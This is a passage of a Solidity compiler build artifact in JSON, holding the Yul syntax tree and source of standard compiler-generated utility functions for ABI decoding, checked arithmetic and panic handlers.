																	"nodeType": "YulIdentifier",
																	"src": "75:12:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "75:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "66:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "128:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "104:23:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "104:30:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "104:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "34:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "42:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "50:5:2",
														"type": ""
													}
												],
												"src": "7:133:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "209:193:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "255:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "264:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "267:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "257:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "257:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "257:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "230:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "239:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "226:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "226:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "251:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "222:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "222:32:2"
															},
															"nodeType": "YulIf",
															"src": "219:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "281:114:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "296:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "310:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "300:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "325:60:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "357:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "368:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "353:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "353:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "377:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "335:17:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "335:50:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "325:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "179:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "190:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "202:6:2",
														"type": ""
													}
												],
												"src": "146:256:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "467:50:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "484:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "504:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "489:14:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "489:21:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "477:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "477:34:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "477:34:2"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "455:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "462:3:2",
														"type": ""
													}
												],
												"src": "408:109:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "588:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "605:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "628:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "610:17:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "610:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "598:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "598:37:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "598:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "576:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "583:3:2",
														"type": ""
													}
												],
												"src": "523:118:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "739:118:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "749:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "761:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "772:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "757:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "757:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "749:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "823:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "836:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "847:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "832:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "832:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "785:37:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "785:65:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "785:65:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "711:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "723:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "734:4:2",
														"type": ""
													}
												],
												"src": "647:210:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "961:124:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "971:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "983:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "994:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "979:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "979:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "971:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1051:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1064:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1075:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1060:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1060:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1007:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1007:71:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1007:71:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "933:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "945:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "956:4:2",
														"type": ""
													}
												],
												"src": "863:222:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1133:143:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1143:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1166:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1148:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1148:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1143:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1177:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1200:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1182:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1182:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1177:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1224:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "1226:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1226:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1226:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1221:1:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1214:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1214:9:2"
															},
															"nodeType": "YulIf",
															"src": "1211:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1256:14:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1265:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1268:1:2"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "1261:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1261:9:2"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "1256:1:2"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1122:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1125:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "1131:1:2",
														"type": ""
													}
												],
												"src": "1091:185:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1327:146:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1337:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1360:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1342:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1342:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1337:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1371:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1394:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1376:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1376:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1371:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1418:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1420:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1420:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1420:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1412:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1415:1:2"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1409:2:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1409:8:2"
															},
															"nodeType": "YulIf",
															"src": "1406:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1450:17:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1462:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1465:1:2"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1458:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1458:9:2"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "1450:4:2"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1313:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1316:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "1322:4:2",
														"type": ""
													}
												],
												"src": "1282:191:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1521:48:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1531:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1556:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1549:6:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1549:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1542:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1542:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1531:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1503:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1513:7:2",
														"type": ""
													}
												],
												"src": "1479:90:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1620:32:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1630:16:2",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1641:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1630:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1602:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1612:7:2",
														"type": ""
													}
												],
												"src": "1575:77:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1701:190:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1711:33:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1738:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1720:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1720:24:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "1711:5:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1834:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1836:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1836:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1836:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1759:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1766:66:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "1756:2:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1756:77:2"
															},
															"nodeType": "YulIf",
															"src": "1753:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1865:20:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1876:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1883:1:2",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1872:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1872:13:2"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "1865:3:2"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1687:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nodeType": "YulTypedName",
														"src": "1697:3:2",
														"type": ""
													}
												],
												"src": "1658:233:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1925:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1942:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1945:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1935:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1935:88:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1935:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2039:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2042:4:2",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2032:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2032:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2032:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2063:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2066:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2056:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2056:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2056:15:2"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "1897:180:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2111:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2128:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2131:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2121:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2121:88:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2121:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2225:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2228:4:2",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2218:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2218:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2218:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2249:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2252:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2242:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2242:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2242:15:2"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2083:180:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2309:76:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2363:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2372:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2375:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2365:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2365:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2365:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2332:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2354:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "2339:14:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2339:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2329:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2329:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2322:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2322:40:2"
															},
															"nodeType": "YulIf",
															"src": "2319:2:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2302:5:2",
														"type": ""
													}
												],
												"src": "2269:116:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
